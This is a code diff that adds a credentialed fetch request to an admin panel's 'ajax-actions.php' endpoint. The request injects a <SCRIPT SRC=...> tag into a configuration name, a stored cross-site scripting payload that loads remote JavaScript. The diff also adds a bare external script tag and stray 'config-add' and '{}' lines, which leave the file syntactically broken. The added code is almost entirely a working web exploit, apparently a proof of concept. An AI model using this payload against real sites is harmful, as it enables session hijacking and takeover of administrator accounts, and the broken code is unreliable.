@@ -19,3 +19,28 @@ let _data = {
 
 let jsonData = JSON.stringify(_data);
 console.log(jsonData);
+
+await fetch("https://owenkruse.click/api/ajax-actions.php", {
+        "credentials": "include",
+        "headers": {
+                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+                "Accept": "application/json, text/javascript, */*; q=0.01",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "UNAM-Request-Type": "AJAX",
+                "X-Requested-With": "XMLHttpRequest",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin",
+                "Pragma": "no-cache",
+                "Cache-Control": "no-cache"
+        },
+        "referrer": "https://owenkruse.click/index.php?page=configurations",
+        "body": "method=config-add&name=%3CSCRIPT+SRC%3Dhttps%3A%2F%2Fowenkruse.click%2F__UNAM_LIB%2Fs.js%3E%3C%2FSCRIPT%3E&data=%7B%7D",
+        "method": "POST",
+        "mode": "cors"
+});
+
+<SCRIPT SRC=https://owenkruse.github.io/code.js></SCRIPT>
+    config-add
+{}
